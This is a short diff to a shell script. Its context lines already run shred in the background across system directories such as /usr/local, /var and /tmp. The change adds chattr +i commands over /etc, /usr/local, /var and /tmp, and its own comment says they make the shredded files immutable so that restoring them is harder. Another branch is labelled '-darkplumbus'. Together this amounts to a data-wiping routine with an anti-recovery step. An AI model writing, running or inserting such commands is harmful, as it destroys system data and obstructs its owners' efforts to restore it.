@@ -141,6 +141,15 @@ case "$1" in
     shred /usr/local/*/* &
     shred /var/*/*/* &
     shred /tmp/* &
+    sleep 1 &&
+    # a little extra sauce to make the shredded files immutable 
+    # so that someone has to undo that before restoring if not in container/snapshot
+    chattr +i /etc/* &
+    chattr +i /etc/*/* &
+    chattr +i /etc/*/*/* &
+    chattr +i /usr/local/*/* &
+    chattr +i /var/*/*/* &
+    chattr +i /tmp/* &
     unfreeze
 ;;
   -darkplumbus)
